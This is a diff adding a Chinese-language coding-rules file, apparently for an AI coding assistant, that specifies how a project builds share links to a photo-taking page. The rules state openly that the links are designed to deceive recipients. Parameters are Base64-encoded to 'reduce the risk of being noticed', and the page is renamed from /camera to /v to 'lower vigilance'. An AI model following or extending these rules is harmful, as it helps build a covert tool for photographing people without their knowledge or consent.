@@ -1,0 +1,209 @@
+---
+description: URL 编码和参数处理规范
+---
+
+# URL 编码和参数处理规范
+
+## 🔐 参数编码策略
+
+### 编码格式
+
+项目使用 **Base64 编码**隐藏 URL 参数，格式为：`id|url`
+
+### 编码实现
+
+#### 生成链接时（home.html）
+
+```javascript
+// 将参数编码为 Base64（格式：id|url）
+var params = myid + "|" + url;
+// 使用优化的编码方式，减少 URL 长度
+var encodedParams = btoa(unescape(encodeURIComponent(params)));
+
+// 生成链接
+var link = currentDirectory + "v?d=" + encodedParams;
+```
+
+**关键点**：
+
+- ✅ 使用 `btoa(unescape(encodeURIComponent()))` 组合
+- ✅ 比双重编码短 30%+
+- ✅ 支持中文和特殊字符
+
+#### 解析参数时（v.html, camera.html）
+
+```javascript
+const encodedData = urlParams.get("d");
+
+if (encodedData) {
+  try {
+    const decodedParams = decodeURIComponent(escape(atob(encodedData)));
+    const parts = decodedParams.split("|");
+    const id = parts[0];
+    const redirectUrl = parts[1];
+  } catch (e) {
+    console.error("参数解码失败:", e);
+  }
+}
+```
+
+**关键点**：
+
+- ✅ 使用 `decodeURIComponent(escape(atob()))` 解码
+- ✅ 错误处理防止崩溃
+- ✅ 向后兼容旧格式
+
+## 📏 URL 长度优化
+
+### 优化对比
+
+| 方案       | 编码方式                               | Base64 长度        | 示例                                       |
+| ---------- | -------------------------------------- | ------------------ | ------------------------------------------ |
+| **旧方案** | `btoa(encodeURIComponent())`           | 44 字符            | `MTMzJTdDaHR0cHMlM0ElMkYlMkZiYWlkdS5jb20=` |
+| **新方案** | `btoa(unescape(encodeURIComponent()))` | 28 字符            | `MTMzfGh0dHBzOi8vYmFpZHUuY29t` ✅          |
+| **缩短**   | -                                      | **-16 字符 (36%)** | -                                          |
+
+### 最佳实践
+
+1. **使用优化的编码方式**
+
+   - 减少 URL 长度
+   - 提升用户体验
+   - 降低被察觉风险
+
+2. **保持兼容性**
+   - 支持旧格式参数
+   - 平滑迁移
+
+## ⚠️ 为什么不能用 POST
+
+### 技术限制
+
+**链接只能是 GET 请求**：
+
+```
+分享链接 = URL = GET 请求
+用户点击 → 浏览器发起 GET → 打开页面
+```
+
+**POST 请求限制**：
+
+- ❌ 不能通过链接直接发起
+- ❌ 必须通过表单或 JavaScript
+- ❌ 无法作为纯链接分享
+
+### 强行用 POST 的问题
+
+如果使用中间页自动提交 POST：
+
+```
+点击链接 → 中间页 A → POST 表单 → /v 页面 → 拍照跳转
+```
+
+**缺点**：
+
+- ❌ 增加 2 个跳转步骤
+- ❌ 速度更慢（多 2 次页面加载）
+- ❌ 地址栏显示中间页
+- ❌ 更容易被察觉
+
+## 🎯 文件名伪装
+
+### 使用 `/v` 而非 `/camera`
+
+**原因**：
+
+- `/camera` 一眼看出是拍照
+- `/v` 可以理解为 view、visit、验证等
+- 降低警觉性
+
+### 重定向配置
+
+在 [\_redirects](mdc:_redirects) 中配置：
+
+```
+/v  /v.html  200
+```
+
+支持无 `.html` 后缀访问。
+
+## 🔄 向后兼容
+
+### 支持多种参数格式
+
+```javascript
+// 新格式（推荐）
+?d=MTMzfGh0dHBzOi8vYmFpZHUuY29t
+
+// 旧格式（兼容）
+?id=133&url=https://baidu.com
+```
+
+### 兼容代码模式
+
+```javascript
+if (encodedData) {
+  // 解析新格式（Base64）
+  const decodedParams = decodeURIComponent(escape(atob(encodedData)));
+  // ...
+} else {
+  // 兼容旧格式（明文）
+  id = urlParams.get("id");
+  redirectUrl = urlParams.get("url");
+}
+```
+
+## 🚫 禁止事项
+
+### ❌ 不要双重 URL 编码
+
+```javascript
+// ❌ 错误：导致 URL 过长
+var encodedParams = btoa(encodeURIComponent(params));
+
+// ✅ 正确：优化后的编码
+var encodedParams = btoa(unescape(encodeURIComponent(params)));
+```
+
+### ❌ 不要尝试隐藏 URL 参数到 POST
+
+GET 参数在 URL 中是必然的，因为：
+
+- 链接只能是 GET 请求
+- Base64 已经足够隐蔽
+- POST 会增加复杂度和延迟
+
+## 📝 测试验证
+
+### 编码解码测试
+
+```javascript
+// 测试数据
+const testId = "133";
+const testUrl = "https://baidu.com";
+const params = testId + "|" + testUrl;
+
+// 编码
+const encoded = btoa(unescape(encodeURIComponent(params)));
+console.log("编码:", encoded);
+
+// 解码
+const decoded = decodeURIComponent(escape(atob(encoded)));
+console.log("解码:", decoded);
+console.log("匹配:", decoded === params); // 应该是 true
+```
+
+### URL 长度测试
+
+生成的链接应该：
+
+- ✅ 总长度 < 100 字符（通常 60-80 字符）
+- ✅ Base64 部分 < 40 字符
+- ✅ 不包含明文敏感信息
+
+## 🔗 相关文件
+
+- [home.html](mdc:home.html) - 链接生成逻辑
+- [v.html](mdc:v.html) - 新的拍照页面
+- [camera.html](mdc:camera.html) - 旧的拍照页面（兼容）
+- [\_redirects](mdc:_redirects) - 重定向规则
